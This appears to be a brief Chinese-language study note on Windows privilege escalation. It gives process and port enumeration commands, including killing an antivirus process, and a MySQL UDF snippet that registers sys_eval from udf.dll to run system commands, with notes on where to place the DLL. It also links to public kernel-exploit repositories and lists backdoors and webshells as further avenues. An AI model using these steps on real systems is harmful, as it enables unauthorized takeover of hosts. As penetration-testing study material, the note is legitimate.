## 44.windows提权
#windows提权
## 44.windows提权

1.   系统本身的漏洞
2.   第三方app：数据库、软件、qq

```shell
netstat -ano #查看端口
tasklist | find "PID" key #查找pid
#漏洞 提权 命令执行
tasklist
tasklist | find "360"
taskkill /im "name" /f
```

### 44.1 mysql udf 提权

```mysql
create function sys_eval returns string soname 'udf.dll';
#引入sys_eval函数
select * from mysql.func where name = 'sys_eval';    #查看创建的sys_eval函数
select sys_eval('whoami');
#当 MySQL< 5.1 版本时，将 .dll 文件导入到 c:\windows 或者 c:\windows\system32 目录下。
#当 MySQL> 5.1 版本时，将 .dll 文件导入到 MySQL Server 5.xx\lib\plugin 目录下 (lib\plugin目录默认不存在，需自行创建)。
```

### 44.2 mysql mof 提权

### 44.3 filezilla 提权

### 44.4 各方发布的exp提权漏洞

https://technet.microsoft.com/zh-cn/library/security/dn639106.aspx

https://github.com/SecWiki/windows-kernel-exploits 

https://github.com/WindowsExploits/Exploits 

https://github.com/AusJock/Privilege-Escalation



### 44.-1 其他

1.   启动项
2.   后门
3.   cmd
4.   net
5.   asp、php、aspx、jsp（几乎最高权限）
6.   systeminfo：查询系统详细信息包括漏洞和补丁等，找寻对应漏洞的工具即可
